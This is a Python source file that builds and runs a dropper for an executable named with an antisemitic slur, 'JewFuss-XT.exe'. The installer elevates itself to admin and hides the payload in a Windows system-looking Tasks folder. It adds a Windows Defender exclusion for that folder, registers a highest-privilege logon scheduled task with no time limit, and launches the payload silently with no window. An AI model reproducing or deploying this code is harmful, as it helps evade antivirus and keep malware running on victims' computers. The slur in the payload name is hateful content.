import subprocess, PyElevate, argparse, ctypes, shutil, psutil, time, sys, os
                                        
parser = argparse.ArgumentParser(add_help=False)
parser.add_argument('--file', type=str, default=None)
parser.add_argument('--icon', type=str, default=None)
parser.add_argument('--name', type=str, default=None)
parser.add_argument('--prevpath', type=str, default=None)
parser.add_argument('--targetpath', type=str, default=None)
args, _ = parser.parse_known_args()

SCRIPT_DIR = os.path.dirname(os.path.abspath(sys.argv[0]))
LOG = os.path.join(SCRIPT_DIR, "installer.log"), False # (path, enable)
os.chdir(SCRIPT_DIR)

defaultpath = r"C:\ProgramData\Microsoft\Windows\Tasks"
defaultexe = "JewFuss-XT.exe"
try:
    if os.path.splitext(sys.argv[0])[1].lower() == ".py":
        installer_icon = f'--icon "{args.icon}"' if args.icon is not None else ""
        if args.file is None:
            input_exe = input(f"Enter the name of the executable in the builds folder, leave empty to use {defaultexe}:\n>> ")
        else:
            print(f'Using provided file: "{args.file}"')
            input_exe = args.file
        if not input_exe:
            input_exe = defaultexe
        while not os.path.exists(f"builds/{input_exe}"):
            input_exe = input("Invalid executable (Tip: make sure the executable is in the builds folder):\n>> ")
        exename_txt = "executablename.txt"
        with open(exename_txt, "w", encoding="utf-8") as f:
            f.write(input_exe)
        tgtpath_txt = "compiled_targetpath.txt"
        compiled_target = args.targetpath or defaultpath
        with open(tgtpath_txt, "w", encoding="utf-8") as f:
            f.write(compiled_target)
        if args.name is not None:
            installer_name = f'--name "{args.name}-installer"'
        else:
            installer_name = f'--name "{input_exe.removesuffix(".exe")}-installer"'
        
        ctypes.windll.kernel32.SetConsoleTitleW("Compiling installer...")
        os.system(
            f'cd "{os.path.dirname(os.path.abspath(sys.argv[0]))}" && '
            f'pyinstaller --onefile '
            f'--add-binary="builds/{input_exe};." '
            f'--add-data="{exename_txt};." '
            f'--add-data="{tgtpath_txt};." '
            f'--distpath=builds --workpath=data '
            f'{installer_name} {installer_icon} "{sys.argv[0]}"'
        )
        os.remove(exename_txt)
        os.remove(tgtpath_txt)
        sys.exit("\nFinished compiling")
except KeyboardInterrupt:
    sys.exit("Keyboard interrupt, exiting compiler...")
except Exception as e:
    print(f"Error compiling: {e}")

def log(s):
    try:
        print(s)
        if LOG[1]:
            with open(LOG[0], "a", encoding="utf-8") as f:
                f.write(s + "\n")
    except Exception:
        pass

try:
    PyElevate.elevate()
    if not PyElevate.elevated():
        log("Elevation failed...")
        sys.exit(0)
except Exception as e:
    log(f"Elevation call error (continuing): {e}")

bp = sys._MEIPASS if getattr(sys, 'frozen', False) else os.path.dirname(os.path.abspath(__file__))
this_name = os.path.basename(sys.argv[0]).lower()

payload_name = None
try:
    with open(os.path.join(bp, "executablename.txt"), "r", encoding="utf-8") as f:
        payload_name = f.read().strip() or None
except Exception:
    pass
if not payload_name:
    try:
        for fn in os.listdir(bp):
            if fn.lower().endswith(".exe") and fn.lower() != this_name:
                payload_name = fn
                break
    except Exception:
        pass
if not payload_name:
    payload_name = defaultexe

extracted_payload = os.path.join(bp, payload_name)

compiled_targetpath = None
try:
    with open(os.path.join(bp, "compiled_targetpath.txt"), "r", encoding="utf-8") as f:
        compiled_targetpath = f.read().strip() or None
except Exception:
    pass

if args.prevpath:
    final_path = os.path.abspath(args.prevpath)
    if not final_path.lower().endswith(".exe"):
        final_path += ".exe"
else:
    tgt = args.targetpath or compiled_targetpath or defaultpath
    tgt = os.path.abspath(tgt)
    if tgt.lower().endswith(".exe"):
        final_path = tgt
    else:
        os.makedirs(tgt, exist_ok=True)
        final_path = os.path.join(tgt, payload_name)

if os.path.basename(final_path).lower().endswith("-installer.exe"):
    final_path = os.path.join(os.path.dirname(final_path), payload_name)

install_dir = os.path.dirname(final_path)
exe_basename = os.path.basename(final_path).lower()
task_name = os.path.splitext(os.path.basename(final_path))[0]

log("Installer start: " + " ".join(sys.argv))
log(f"Payload: {extracted_payload}")
log(f"Install to: {final_path}")
log(f"Install dir: {install_dir}")
log(f"Installer exe name: {this_name}")
log(f"Target exe basename: {exe_basename}")
log(f"Task name: {task_name}")

# if parent is the PAYLOAD (not installer), terminate it
try:
    p = psutil.Process(os.getppid())
    pexe_base = os.path.basename((p.exe() or "")).lower()
    if pexe_base == exe_basename and not pexe_base.endswith("-installer.exe"):
        log("Terminating parent payload exe " + pexe_base)
        p.terminate()
        try:
            p.wait(timeout=5)
        except Exception:
            pass
except Exception as e:
    log(f"Parent terminate note: {e}")

# if an existing scheduled task points elsewhere, stop/delete it, keep it if no already pointing to the payload
same_task_target = False
try:
    ps_cmd = (
        'powershell -NoProfile -Command '
        f'$t = Get-ScheduledTask -TaskName "{task_name}" -ErrorAction SilentlyContinue; '
        'if($t){ $a = $t.Actions | Select-Object -First 1; $exe = $a.Execute; '
        'if($exe -match \'^\"(.+)\"$\'){$exe=$Matches[1]}; [Console]::Out.WriteLine($exe) }'
    )
    r = subprocess.run(ps_cmd, shell=True, capture_output=True, text=True)
    existing = r.stdout.strip().strip('"')
    if existing:
        existing_full = os.path.normcase(os.path.abspath(existing))
        final_full = os.path.normcase(os.path.abspath(final_path))
        if existing_full == final_full:
            same_task_target = True
            log(f"Scheduled task already targets this exe, keeping it: {existing_full}")
except Exception as e:
    log(f"Scheduled task inspection error (will recreate): {e}")

if not same_task_target:
    try:
        subprocess.run(f'schtasks /end /tn "{task_name}" >nul 2>&1', shell=True)
        subprocess.run(f'schtasks /delete /tn "{task_name}" /f >nul 2>&1', shell=True)
        log(f"Stopped and deleted existing scheduled task: {task_name}")
    except Exception as e:
        log(f"schtasks pre-clean error: {e}")

# kill any running instances of the TARGET payload by basename
try:
    for pr in psutil.process_iter(['pid','name','exe']):
        try:
            pexe = (pr.info.get('exe') or '')
            if os.path.basename(pexe).lower() == exe_basename:
                pr.terminate()
        except Exception:
            pass
    time.sleep(0.7)
    subprocess.run(f'taskkill /im "{exe_basename}" /f >nul 2>&1', shell=True)
    time.sleep(0.4)
    log(f"Killed any running '{exe_basename}'")
except Exception as e:
    log(f"Bulk kill error: {e}")

# delete old file
if os.path.exists(final_path):
    ok = False
    for i in range(7):
        try:
            os.remove(final_path)
            ok = True
            break
        except Exception as e:
            log(f"Delete retry {i+1}: {e}")
            time.sleep(0.6)
    if not ok:
        log("Fatal: could not delete old exe")
        sys.exit(1)

# copy payload
try:
    if not os.path.exists(install_dir):
        os.makedirs(install_dir, exist_ok=True)
except Exception as e:
    log(f"Dir create error: {e}")
    sys.exit(1)

try:
    shutil.copy(extracted_payload, final_path)
    log("Copied new exe")
except Exception as e:
    log(f"Copy error: {e}")
    sys.exit(1)

# defender exclusion (non-fatal)
try:
    folder = os.path.dirname(final_path)
    subprocess.run(f'powershell -NoProfile -Command "Add-MpPreference -ExclusionPath \\"{folder}\\""', shell=True, check=True)
    log(f"Defender exclusion added: {folder}")
except Exception as e:
    log(f"Defender exclusion error: {e}")

# scheduled task if not exists
if not same_task_target:
    try:
        schtasks_cmd = f'schtasks /create /tn "{task_name}" /tr "{final_path}" /sc onlogon /ru "INTERACTIVE" /rl highest /f /it'
        disable_cmd = (
            'powershell -NoProfile -Command '
            f'"$t=Get-ScheduledTask -TaskName \\"{task_name}\\"; '
            '$s=$t.Settings; $s.DisallowStartIfOnBatteries=$false; '
            '$s.StopIfGoingOnBatteries=$false; $s.ExecutionTimeLimit=\'PT0S\'; '
            f'Set-ScheduledTask -TaskName \\"{task_name}\\" -Settings $s"'
        )
        subprocess.run(schtasks_cmd, shell=True, check=True)
        subprocess.run(disable_cmd, shell=True, check=True)
        log(f"Scheduled task created: {task_name}")
    except Exception as e:
        log(f"schtasks error: {e}")
else:
    log("Skipped task re-creation (already points to this exe)")

# start payload
try:
    si = subprocess.STARTUPINFO()
    si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
    subprocess.Popen(final_path, startupinfo=si, creationflags=0x00000008 | 0x08000000, close_fds=True)
    log("Launched new exe")
except Exception as e:
    log(f"Run new exe error: {e}")
    sys.exit(1)

sys.exit(0)